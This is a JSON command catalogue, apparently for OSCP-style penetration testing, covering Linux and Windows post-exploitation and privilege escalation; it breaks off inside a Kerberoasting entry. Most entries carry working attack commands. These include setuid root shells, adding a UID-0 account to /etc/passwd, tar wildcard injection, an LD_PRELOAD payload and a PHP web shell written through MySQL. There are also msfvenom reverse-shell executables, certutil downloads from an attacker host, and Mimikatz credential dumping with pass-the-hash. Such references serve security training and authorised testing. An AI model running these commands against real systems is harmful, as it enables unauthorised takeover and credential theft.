{
  "category": "post-exploit",
  "description": "Post-exploitation and privilege escalation commands",
  "commands": [
    {
      "id": "linux-suid-find",
      "name": "Find SUID Binaries",
      "category": "post-exploit",
      "command": "find / -perm -4000 -type f 2>/dev/null",
      "description": "Find all SUID binaries for privilege escalation",
      "tags": ["LINUX", "PRIVESC", "QUICK_WIN", "OSCP:HIGH", "ENUM"],
      "variables": [],
      "flag_explanations": {
        "/": "Start search from root directory",
        "-perm -4000": "Files with SUID bit set (exactly 4000 or more)",
        "-type f": "Regular files only, not directories",
        "2>/dev/null": "Suppress permission denied errors"
      },
      "success_indicators": [
        "/usr/bin/passwd",
        "/usr/bin/sudo",
        "Unusual SUID binaries",
        "Custom SUID programs"
      ],
      "failure_indicators": [
        "No output",
        "Permission denied on all",
        "find: command not found"
      ],
      "next_steps": [
        "Check GTFOBins for SUID exploitation: https://gtfobins.github.io/",
        "Look for custom/unusual SUID binaries",
        "Try: strings /path/to/suid/binary",
        "Test exploitation: /path/to/binary -p"
      ],
      "alternatives": ["find / -perm -u=s -type f 2>/dev/null", "find / -perm /4000 2>/dev/null"],
      "notes": "Focus on non-standard SUID binaries first",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-sudo-check",
      "name": "Check Sudo Privileges",
      "category": "post-exploit",
      "command": "sudo -l",
      "description": "List allowed sudo commands for current user",
      "tags": ["LINUX", "PRIVESC", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-l": "List user's privileges or check a specific command",
        "-ll": "Long list format with more details (alternative)",
        "-n": "Non-interactive, avoid password prompt"
      },
      "success_indicators": [
        "(ALL) NOPASSWD:",
        "(root) NOPASSWD:",
        "User may run the following",
        "specific command paths"
      ],
      "failure_indicators": [
        "Sorry, user may not run sudo",
        "a password is required",
        "sudo: command not found"
      ],
      "next_steps": [
        "Check GTFOBins for sudo exploitation",
        "Try environment variables: sudo LD_PRELOAD=/tmp/lib.so command",
        "Path hijacking: sudo env_keep+=LD_PRELOAD",
        "Wildcard exploitation if * present"
      ],
      "alternatives": ["sudo -ll", "cat /etc/sudoers 2>/dev/null"],
      "notes": "NOPASSWD entries are quick wins",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-capabilities",
      "name": "Find Capabilities",
      "category": "post-exploit",
      "command": "getcap -r / 2>/dev/null",
      "description": "Find binaries with special capabilities",
      "tags": ["LINUX", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-r": "Recursive search",
        "/": "Start from root directory",
        "2>/dev/null": "Suppress errors"
      },
      "success_indicators": [
        "cap_setuid",
        "cap_dac_override",
        "cap_sys_admin",
        "=ep or =+ep"
      ],
      "failure_indicators": [
        "No output",
        "getcap: command not found",
        "Operation not permitted"
      ],
      "next_steps": [
        "Check GTFOBins for capability exploitation",
        "Python with cap_setuid: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "Perl with cap_setuid: perl -e 'use POSIX; setuid(0); exec \"/bin/bash\"'",
        "Research specific capability abuse"
      ],
      "alternatives": ["find / -type f -exec getcap {} \\; 2>/dev/null"],
      "notes": "cap_setuid is often exploitable",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-cron-jobs",
      "name": "Enumerate Cron Jobs",
      "category": "post-exploit",
      "command": "cat /etc/crontab && ls -la /etc/cron.*",
      "description": "Check system cron jobs for privilege escalation",
      "tags": ["LINUX", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "/etc/crontab": "System-wide crontab file",
        "/etc/cron.*": "Cron directories (daily, hourly, etc.)",
        "-la": "Long listing with hidden files"
      },
      "success_indicators": [
        "root user cron jobs",
        "Writable script paths",
        "Wildcard usage",
        "Missing script files"
      ],
      "failure_indicators": [
        "Permission denied",
        "No cron jobs found",
        "Empty crontab"
      ],
      "next_steps": [
        "Check script permissions: ls -la /path/to/script",
        "Monitor processes: watch -n 1 'ps aux | grep root'",
        "Check user crontabs: cat /var/spool/cron/crontabs/*",
        "Exploit wildcards: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > --checkpoint-action=exec=sh"
      ],
      "alternatives": ["crontab -l", "systemctl list-timers", "grep -r . /etc/cron* 2>/dev/null"],
      "notes": "Check for PATH manipulation opportunities",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-writable-passwd",
      "name": "Check /etc/passwd Permissions",
      "category": "post-exploit",
      "command": "ls -la /etc/passwd && ls -la /etc/shadow",
      "description": "Check if passwd/shadow files are writable",
      "tags": ["LINUX", "PRIVESC", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-la": "Long listing with permissions",
        "/etc/passwd": "User account file",
        "/etc/shadow": "Password hash file"
      },
      "success_indicators": [
        "Write permission for group/other",
        "-rw-rw-rw-",
        "Readable shadow file"
      ],
      "failure_indicators": [
        "-rw-r--r-- root root",
        "Permission denied for shadow",
        "Files not found"
      ],
      "next_steps": [
        "Add root user to passwd: echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
        "Create password hash: openssl passwd -1 password123",
        "Add user with UID 0: echo 'hacker:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd",
        "Copy shadow for offline cracking: cat /etc/shadow > /tmp/shadow.txt"
      ],
      "alternatives": ["test -w /etc/passwd && echo 'Writable!'", "find /etc -writable 2>/dev/null"],
      "notes": "Writable /etc/passwd is instant root",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-kernel-version",
      "name": "Check Kernel Version",
      "category": "post-exploit",
      "command": "uname -a && cat /proc/version",
      "description": "Identify kernel version for exploit research",
      "tags": ["LINUX", "ENUM", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-a": "All system information",
        "/proc/version": "Detailed kernel version info"
      },
      "success_indicators": [
        "Old kernel versions (< 3.x)",
        "Known vulnerable versions",
        "Ubuntu 16.04 or older",
        "CentOS 6 or older"
      ],
      "failure_indicators": [
        "Latest kernel version",
        "Hardened kernel",
        "grsec/PaX enabled"
      ],
      "next_steps": [
        "Search exploits: searchsploit linux kernel <version>",
        "Check exploit database: site:exploit-db.com linux kernel <version>",
        "Common exploits: DirtyCOW (CVE-2016-5195), sudo Baron Samedit (CVE-2021-3156)",
        "Compile exploit: gcc exploit.c -o exploit"
      ],
      "alternatives": ["hostnamectl", "lsb_release -a", "cat /etc/os-release"],
      "notes": "Match exact kernel version for reliability",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-linpeas",
      "name": "Run LinPEAS Enumeration",
      "category": "post-exploit",
      "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      "description": "Comprehensive Linux privilege escalation enumeration",
      "tags": ["LINUX", "PRIVESC", "AUTOMATED", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-L": "Follow redirects",
        "|": "Pipe to shell",
        "sh": "Execute with shell"
      },
      "success_indicators": [
        "RED/YELLOW findings",
        "99% PE vector",
        "Possible password found",
        "Interesting files owned"
      ],
      "failure_indicators": [
        "curl: command not found",
        "Connection refused",
        "403 Forbidden"
      ],
      "next_steps": [
        "Focus on RED/YELLOW findings first",
        "Check 99% PE vectors immediately",
        "Review SUID section carefully",
        "Check suggested exploits section"
      ],
      "alternatives": ["wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "Transfer manually and run: ./linpeas.sh"],
      "notes": "Can be noisy, use -q for quiet mode",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-pspy",
      "name": "Monitor Processes with pspy",
      "category": "post-exploit",
      "command": "./pspy64 -pf -i 1000",
      "description": "Monitor running processes without root",
      "tags": ["LINUX", "PRIVESC", "ENUM", "OSCP:MEDIUM"],
      "variables": [],
      "flag_explanations": {
        "-p": "Print process commands",
        "-f": "Print file system events",
        "-i": "Interval in milliseconds"
      },
      "success_indicators": [
        "Root process execution",
        "Cron job execution",
        "Script execution patterns",
        "Temporary file creation"
      ],
      "failure_indicators": [
        "No new processes",
        "Permission denied",
        "Binary not executable"
      ],
      "next_steps": [
        "Wait for cron jobs to trigger",
        "Look for scripts run as root",
        "Identify writable script paths",
        "Note execution patterns and timing"
      ],
      "alternatives": ["watch -n 1 'ps aux | grep -v grep'", "while true; do ps aux | grep root; sleep 1; done"],
      "notes": "Download from: https://github.com/DominicBreuker/pspy",
      "oscp_relevance": "medium"
    },
    {
      "id": "linux-mysql-root",
      "name": "MySQL Running as Root",
      "category": "post-exploit",
      "command": "ps aux | grep mysql && mysql -u root",
      "description": "Check if MySQL is running as root with no password",
      "tags": ["LINUX", "PRIVESC", "DATABASE", "OSCP:MEDIUM"],
      "variables": [],
      "flag_explanations": {
        "ps aux": "Show all processes",
        "grep mysql": "Filter MySQL processes",
        "-u root": "Connect as root user"
      },
      "success_indicators": [
        "mysql running as root",
        "MySQL prompt without password",
        "Welcome to MySQL/MariaDB"
      ],
      "failure_indicators": [
        "Access denied for user",
        "mysql: command not found",
        "Can't connect to MySQL server"
      ],
      "next_steps": [
        "UDF exploitation: SELECT sys_exec('chmod +s /bin/bash')",
        "Read files: SELECT LOAD_FILE('/etc/shadow')",
        "Write files: SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/shell.php'",
        "Check mysql history: cat ~/.mysql_history"
      ],
      "alternatives": ["mysql -u root -p (try blank password)", "mariadb -u root"],
      "notes": "UDF library needed for command execution",
      "oscp_relevance": "medium"
    },
    {
      "id": "linux-docker-escape",
      "name": "Docker Container Escape",
      "category": "post-exploit",
      "command": "cat /proc/1/cgroup | grep docker && ls -la /.dockerenv",
      "description": "Check if running in Docker container",
      "tags": ["LINUX", "PRIVESC", "CONTAINER", "OSCP:MEDIUM"],
      "variables": [],
      "flag_explanations": {
        "/proc/1/cgroup": "Process control groups",
        "grep docker": "Check for docker signatures",
        "/.dockerenv": "Docker environment file"
      },
      "success_indicators": [
        "docker in cgroup output",
        ".dockerenv exists",
        "Container ID visible"
      ],
      "failure_indicators": [
        "No docker indicators",
        "File not found",
        "Not in container"
      ],
      "next_steps": [
        "Check capabilities: capsh --print",
        "Try privileged operations: mount /dev/sda1 /mnt",
        "Docker socket: find / -name docker.sock 2>/dev/null",
        "Exploit CVE-2019-5736 if old Docker"
      ],
      "alternatives": ["hostname", "df -h", "mount | grep overlay"],
      "notes": "Privileged containers can escape easily",
      "oscp_relevance": "medium"
    },
    {
      "id": "linux-nfs-root-squash",
      "name": "NFS Root Squashing Check",
      "category": "post-exploit",
      "command": "cat /etc/exports | grep no_root_squash",
      "description": "Check for misconfigured NFS exports",
      "tags": ["LINUX", "PRIVESC", "NETWORK", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "/etc/exports": "NFS export configuration",
        "no_root_squash": "Allows root access from client"
      },
      "success_indicators": [
        "no_root_squash",
        "Writable export paths",
        "* (everyone) access"
      ],
      "failure_indicators": [
        "root_squash",
        "File not found",
        "Empty exports"
      ],
      "next_steps": [
        "Mount on attacker: mount -t nfs <IP>:/share /mnt",
        "Create SUID binary: cp /bin/bash /mnt/bash; chmod +s /mnt/bash",
        "Execute on target: /path/to/bash -p",
        "Check showmount: showmount -e <IP>"
      ],
      "alternatives": ["showmount -e localhost", "rpcinfo -p"],
      "notes": "Requires NFS client on attacker machine",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-path-hijack",
      "name": "PATH Hijacking Check",
      "category": "post-exploit",
      "command": "echo $PATH && find / -writable -type d 2>/dev/null | grep -E '^/(usr|bin|sbin)'",
      "description": "Find writable directories in PATH",
      "tags": ["LINUX", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "$PATH": "Current PATH variable",
        "-writable": "Directories we can write to",
        "-type d": "Directories only"
      },
      "success_indicators": [
        "Writable directory in PATH",
        "/tmp or /dev/shm in PATH",
        "Current directory (.) in PATH"
      ],
      "failure_indicators": [
        "No writable PATH directories",
        "Standard secure PATH",
        "No output"
      ],
      "next_steps": [
        "Find SUID/sudo commands using relative paths",
        "Create malicious binary: echo '/bin/bash' > /tmp/ls; chmod +x /tmp/ls",
        "Export PATH: export PATH=/tmp:$PATH",
        "Trigger vulnerable binary"
      ],
      "alternatives": ["env | grep PATH", "which -a ls"],
      "notes": "Look for SUID binaries calling commands without full paths",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-ld-preload",
      "name": "LD_PRELOAD Exploitation",
      "category": "post-exploit",
      "command": "sudo -l | grep -E 'env_keep.*LD_PRELOAD'",
      "description": "Check if LD_PRELOAD is preserved in sudo",
      "tags": ["LINUX", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "sudo -l": "List sudo privileges",
        "env_keep": "Environment variables preserved",
        "LD_PRELOAD": "Library preloading variable"
      },
      "success_indicators": [
        "env_keep+=LD_PRELOAD",
        "env_keep+=LD_LIBRARY_PATH",
        "SETENV tag present"
      ],
      "failure_indicators": [
        "No env_keep",
        "env_reset without env_keep",
        "No sudo access"
      ],
      "next_steps": [
        "Create malicious library: gcc -fPIC -shared -o /tmp/lib.so exploit.c",
        "Exploit code: void _init() { setuid(0); system(\"/bin/bash\"); }",
        "Run: sudo LD_PRELOAD=/tmp/lib.so <allowed_command>",
        "Alternative: sudo LD_LIBRARY_PATH=/tmp <command>"
      ],
      "alternatives": ["env | grep LD_", "ldd /usr/bin/sudo"],
      "notes": "Compile with -nostartfiles if needed",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-systemctl-privesc",
      "name": "Systemctl SUID Exploitation",
      "category": "post-exploit",
      "command": "find / -name systemctl -perm -4000 2>/dev/null",
      "description": "Check if systemctl has SUID bit",
      "tags": ["LINUX", "PRIVESC", "OSCP:HIGH", "QUICK_WIN"],
      "variables": [],
      "flag_explanations": {
        "-name systemctl": "Find systemctl binary",
        "-perm -4000": "Check for SUID bit"
      },
      "success_indicators": [
        "/bin/systemctl with SUID",
        "/usr/bin/systemctl with SUID"
      ],
      "failure_indicators": [
        "No results",
        "Regular permissions only"
      ],
      "next_steps": [
        "Create service file: echo '[Service]\\nType=oneshot\\nExecStart=/bin/bash -c \"chmod +s /bin/bash\"\\n[Install]\\nWantedBy=multi-user.target' > /tmp/root.service",
        "Link service: systemctl link /tmp/root.service",
        "Start service: systemctl start root.service",
        "Get root shell: /bin/bash -p"
      ],
      "alternatives": ["ls -la /bin/systemctl", "getcap /bin/systemctl"],
      "notes": "Works on misconfigured systems",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-wildcard-injection",
      "name": "Wildcard Injection in Scripts",
      "category": "post-exploit",
      "command": "grep -r '\\*' /etc/cron* /var/spool/cron* 2>/dev/null",
      "description": "Find scripts using wildcards in cron",
      "tags": ["LINUX", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-r": "Recursive search",
        "\\*": "Search for asterisk/wildcard",
        "/etc/cron*": "Cron directories"
      },
      "success_indicators": [
        "tar with wildcards",
        "cp with wildcards",
        "rsync with wildcards",
        "chown with wildcards"
      ],
      "failure_indicators": [
        "No wildcards found",
        "No cron access",
        "Properly quoted wildcards"
      ],
      "next_steps": [
        "For tar: echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'",
        "Create shell.sh: echo 'chmod +s /bin/bash' > shell.sh",
        "For rsync: echo '' > '-e sh shell.sh'",
        "Wait for cron execution"
      ],
      "alternatives": ["find /etc -name '*.sh' -exec grep '\\*' {} \\;"],
      "notes": "Common in backup scripts",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-whoami-privs",
      "name": "Check Current Privileges",
      "category": "post-exploit",
      "command": "whoami /priv",
      "description": "List current user privileges on Windows",
      "tags": ["WINDOWS", "PRIVESC", "ENUM", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "/priv": "Display privileges of current user",
        "/groups": "Display group membership (alternative)",
        "/all": "Display all information"
      },
      "success_indicators": [
        "SeImpersonatePrivilege",
        "SeDebugPrivilege",
        "SeBackupPrivilege",
        "SeTakeOwnershipPrivilege"
      ],
      "failure_indicators": [
        "All privileges disabled",
        "Access denied",
        "Command not recognized"
      ],
      "next_steps": [
        "SeImpersonatePrivilege: Use JuicyPotato/PrintSpoofer",
        "SeDebugPrivilege: Migrate to SYSTEM process",
        "SeBackupPrivilege: Read SAM/SYSTEM hives",
        "Check groups: whoami /groups"
      ],
      "alternatives": ["whoami /all", "net user %username%", "Get-ADUser $env:USERNAME"],
      "notes": "SeImpersonatePrivilege = instant win on older Windows",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-systeminfo",
      "name": "System Information Gathering",
      "category": "post-exploit",
      "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
      "description": "Get Windows version for exploit research",
      "tags": ["WINDOWS", "ENUM", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "systeminfo": "Display detailed system configuration",
        "findstr": "Filter output for specific lines",
        "/B": "Match beginning of line",
        "/C:": "Literal search string"
      },
      "success_indicators": [
        "Windows 7",
        "Windows Server 2008",
        "Windows Server 2012",
        "x64-based PC"
      ],
      "failure_indicators": [
        "Access denied",
        "Command not found",
        "RPC server unavailable"
      ],
      "next_steps": [
        "Search exploits: searchsploit windows <version>",
        "Check hotfixes: wmic qfe list",
        "Windows Exploit Suggester: python windows-exploit-suggester.py --database db.xlsx --systeminfo sysinfo.txt",
        "Check architecture for payload: x64 vs x86"
      ],
      "alternatives": ["ver", "wmic os get Caption,Version,BuildNumber", "Get-ComputerInfo"],
      "notes": "Save full output for Windows Exploit Suggester",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-unquoted-service",
      "name": "Find Unquoted Service Paths",
      "category": "post-exploit",
      "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
      "description": "Find services with unquoted paths for privilege escalation",
      "tags": ["WINDOWS", "PRIVESC", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "wmic": "Windows Management Instrumentation Command",
        "findstr /i": "Case insensitive search",
        "/v": "Inverse match (exclude)",
        "\\\"\"": "Find paths without quotes"
      },
      "success_indicators": [
        "C:\\Program Files\\Service Name\\",
        "Spaces in path without quotes",
        "Auto start services"
      ],
      "failure_indicators": [
        "No unquoted paths",
        "All paths quoted",
        "Access denied"
      ],
      "next_steps": [
        "Check permissions: icacls \"C:\\Program Files\\Service Name\"",
        "Create malicious exe: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Service.exe",
        "Place exe in path: copy Service.exe \"C:\\Program Files\\Service.exe\"",
        "Restart service: sc stop <service> && sc start <service>"
      ],
      "alternatives": ["Get-WmiObject win32_service | Select Name, PathName", "sc qc <service>"],
      "notes": "Requires write access to parent directory",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-alwaysinstallelevated",
      "name": "Check AlwaysInstallElevated",
      "category": "post-exploit",
      "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
      "description": "Check if MSI files install with SYSTEM privileges",
      "tags": ["WINDOWS", "PRIVESC", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "reg query": "Query registry values",
        "HKLM": "HKEY_LOCAL_MACHINE hive",
        "HKCU": "HKEY_CURRENT_USER hive",
        "/v": "Query specific value name"
      },
      "success_indicators": [
        "AlwaysInstallElevated    REG_DWORD    0x1",
        "Both HKLM and HKCU set to 0x1"
      ],
      "failure_indicators": [
        "ERROR: The system was unable to find",
        "0x0 value",
        "Only one location set"
      ],
      "next_steps": [
        "Create malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shell.msi",
        "Install MSI: msiexec /quiet /qn /i shell.msi",
        "Alternative: use Metasploit always_install_elevated module",
        "Clean up: del shell.msi"
      ],
      "alternatives": ["Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "PowerUp.ps1 Invoke-AllChecks"],
      "notes": "Both keys must be set for exploitation",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-scheduled-tasks",
      "name": "Enumerate Scheduled Tasks",
      "category": "post-exploit",
      "command": "schtasks /query /fo LIST /v | findstr /C:\"Task To Run\" /C:\"Run As User\"",
      "description": "Find scheduled tasks running as SYSTEM",
      "tags": ["WINDOWS", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "/query": "Display scheduled tasks",
        "/fo LIST": "Format output as list",
        "/v": "Verbose output with all properties"
      },
      "success_indicators": [
        "Run As User: SYSTEM",
        "Run As User: Administrator",
        "Writable script paths",
        "Missing script files"
      ],
      "failure_indicators": [
        "Access denied",
        "No tasks found",
        "All run as current user"
      ],
      "next_steps": [
        "Check script permissions: icacls <script_path>",
        "Replace script content if writable",
        "Check next run time in task details",
        "Force run: schtasks /run /tn <task_name>"
      ],
      "alternatives": ["Get-ScheduledTask | Select TaskName,Principal", "dir C:\\Windows\\System32\\Tasks"],
      "notes": "Focus on tasks with writable binaries/scripts",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-service-permissions",
      "name": "Check Service Permissions",
      "category": "post-exploit",
      "command": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
      "description": "Find services with weak permissions",
      "tags": ["WINDOWS", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-u": "Suppress errors",
        "-w": "Show only writable objects",
        "-c": "Service objects",
        "-q": "Quiet/minimal output",
        "-v": "Verbose",
        "/accepteula": "Auto accept EULA"
      },
      "success_indicators": [
        "SERVICE_CHANGE_CONFIG",
        "SERVICE_ALL_ACCESS",
        "SERVICE_START",
        "SERVICE_STOP"
      ],
      "failure_indicators": [
        "No matching objects",
        "Access denied",
        "accesschk.exe not found"
      ],
      "next_steps": [
        "Query service: sc qc <service>",
        "Change binary path: sc config <service> binPath= \"C:\\temp\\shell.exe\"",
        "Restart service: sc stop <service> && sc start <service>",
        "Restore original: sc config <service> binPath= \"<original_path>\""
      ],
      "alternatives": ["sc sdshow <service>", "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>"],
      "notes": "Download accesschk from Sysinternals",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-potato-attacks",
      "name": "Potato Attacks (JuicyPotato)",
      "category": "post-exploit",
      "command": "JuicyPotato.exe -l 1337 -p C:\\windows\\system32\\cmd.exe -t * -c {CLSID}",
      "description": "Exploit SeImpersonatePrivilege for SYSTEM shell",
      "tags": ["WINDOWS", "PRIVESC", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "-l": "Local COM server listen port",
        "-p": "Program to launch",
        "-t": "CreateProcess call type (*=try both)",
        "-c": "CLSID to abuse"
      },
      "success_indicators": [
        "CreateProcessWithTokenW OK",
        "Process created",
        "SYSTEM shell obtained"
      ],
      "failure_indicators": [
        "Operation failed",
        "Cannot bind to port",
        "No valid CLSID"
      ],
      "next_steps": [
        "Test CLSIDs: JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
        "CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID",
        "Alternative: PrintSpoofer.exe -i -c cmd",
        "RoguePotato for newer Windows"
      ],
      "alternatives": ["PrintSpoofer.exe -i -c cmd", "SweetPotato.exe -p cmd"],
      "notes": "Works up to Windows Server 2016/Windows 10 1809",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-sam-system-backup",
      "name": "SAM/SYSTEM Backup Files",
      "category": "post-exploit",
      "command": "dir /s /b C:\\Windows\\repair\\SAM C:\\Windows\\System32\\config\\RegBack\\SAM",
      "description": "Find backup SAM/SYSTEM files for hash extraction",
      "tags": ["WINDOWS", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "/s": "Search subdirectories",
        "/b": "Bare format (paths only)",
        "SAM": "Security Account Manager database",
        "SYSTEM": "System registry hive"
      },
      "success_indicators": [
        "SAM file found",
        "SYSTEM file found",
        "Readable backup files"
      ],
      "failure_indicators": [
        "File not found",
        "Access denied",
        "Empty RegBack folder"
      ],
      "next_steps": [
        "Copy files: copy C:\\Windows\\repair\\SAM C:\\temp\\",
        "Transfer to attacker: certutil -urlcache -f http://<IP>/nc.exe nc.exe",
        "Extract hashes: impacket-secretsdump -sam SAM -system SYSTEM LOCAL",
        "Crack or PTH: hashcat -m 1000 hashes.txt wordlist.txt"
      ],
      "alternatives": ["reg save HKLM\\SAM sam.save", "reg save HKLM\\SYSTEM system.save"],
      "notes": "Requires backup files or SeBackupPrivilege",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-stored-credentials",
      "name": "Search for Stored Credentials",
      "category": "post-exploit",
      "command": "cmdkey /list",
      "description": "List stored credentials in Windows Credential Manager",
      "tags": ["WINDOWS", "PRIVESC", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "/list": "Display all stored credentials",
        "cmdkey": "Windows credential manager CLI"
      },
      "success_indicators": [
        "Domain credentials",
        "Generic credentials",
        "Administrator entries"
      ],
      "failure_indicators": [
        "Currently stored credentials: none",
        "Access denied"
      ],
      "next_steps": [
        "Run as stored user: runas /savecred /user:admin cmd",
        "Extract with Mimikatz: sekurlsa::credman",
        "Check RDP: mstsc /v:<server>",
        "PowerShell: $cred = Get-Credential; Start-Process cmd -Credential $cred"
      ],
      "alternatives": ["dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\", "vaultcmd /listcreds:\"Windows Credentials\""],
      "notes": "RunAs with /savecred is powerful",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-dpapi-masterkeys",
      "name": "DPAPI Master Keys",
      "category": "post-exploit",
      "command": "dir /a /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\",
      "description": "Find DPAPI master keys for credential decryption",
      "tags": ["WINDOWS", "PRIVESC", "OSCP:MEDIUM"],
      "variables": [],
      "flag_explanations": {
        "/a": "All files including hidden",
        "/s": "Recursive search",
        "/b": "Bare format",
        "Protect": "DPAPI master keys location"
      },
      "success_indicators": [
        "S-1-5-21-* folders",
        "Master key GUIDs",
        "Preferred file present"
      ],
      "failure_indicators": [
        "No files found",
        "Access denied",
        "Empty folders"
      ],
      "next_steps": [
        "Extract with Mimikatz: dpapi::masterkey /in:<masterkey>",
        "Decrypt Chrome passwords: dpapi::chrome",
        "Decrypt RDP passwords: dpapi::rdg",
        "SharpDPAPI for automation"
      ],
      "alternatives": ["SharpDPAPI.exe masterkeys", "mimikatz dpapi::masterkey"],
      "notes": "Requires user password or domain backup key",
      "oscp_relevance": "medium"
    },
    {
      "id": "windows-autologon",
      "name": "AutoLogon Credentials",
      "category": "post-exploit",
      "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" | findstr /i \"DefaultUserName DefaultDomainName DefaultPassword\"",
      "description": "Check registry for autologon credentials",
      "tags": ["WINDOWS", "PRIVESC", "QUICK_WIN", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "reg query": "Query registry values",
        "Winlogon": "Windows logon configuration",
        "findstr /i": "Case insensitive search"
      },
      "success_indicators": [
        "DefaultPassword value present",
        "DefaultUserName with admin",
        "Clear text password"
      ],
      "failure_indicators": [
        "No DefaultPassword",
        "Values not found",
        "Access denied"
      ],
      "next_steps": [
        "Use credentials: net use \\\\<IP> /user:<user> <password>",
        "RDP access: mstsc /v:<IP>",
        "PSExec: psexec.py <domain>/<user>:<pass>@<IP>",
        "Check for reuse on other systems"
      ],
      "alternatives": ["Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "netpass.exe"],
      "notes": "Common in kiosk/lab environments",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-pass-the-hash",
      "name": "Pass the Hash Attack",
      "category": "post-exploit",
      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
      "description": "Extract NTLM hashes for pass-the-hash attacks",
      "tags": ["WINDOWS", "PRIVESC", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Enable debug privilege",
        "sekurlsa::logonpasswords": "Dump logon passwords/hashes",
        "exit": "Exit after execution"
      },
      "success_indicators": [
        "NTLM hash extracted",
        "Authentication Id",
        "Administrator hash"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa",
        "Access denied",
        "No credentials"
      ],
      "next_steps": [
        "PTH with psexec: psexec.py -hashes <LM>:<NTLM> administrator@<IP>",
        "Evil-WinRM: evil-winrm -i <IP> -u Administrator -H <hash>",
        "SMB access: smbclient //<IP>/C$ -U Administrator --pw-nt-hash <hash>",
        "Crack hash: hashcat -m 1000 hash.txt rockyou.txt"
      ],
      "alternatives": ["sekurlsa::pth /user:admin /ntlm:<hash> /domain:.", "Invoke-Mimikatz -DumpCreds"],
      "notes": "Requires local admin or SYSTEM",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-kerberoasting",
      "name": "Kerberoasting Attack",
      "category": "post-exploit",
      "command": "setspn -T <DOMAIN> -Q */* | findstr /i service",
      "description": "Find service accounts for Kerberoasting",
      "tags": ["WINDOWS", "PRIVESC", "AD", "OSCP:HIGH"],
      "variables": [],
      "flag_explanations": {
        "setspn": "Service Principal Name tool",
        "-T": "Target domain",
        "-Q": "Query SPNs",
        "*/*": "All SPNs"
      },
      "success_indicators": [
        "Service account SPNs",
        "SQL service accounts",
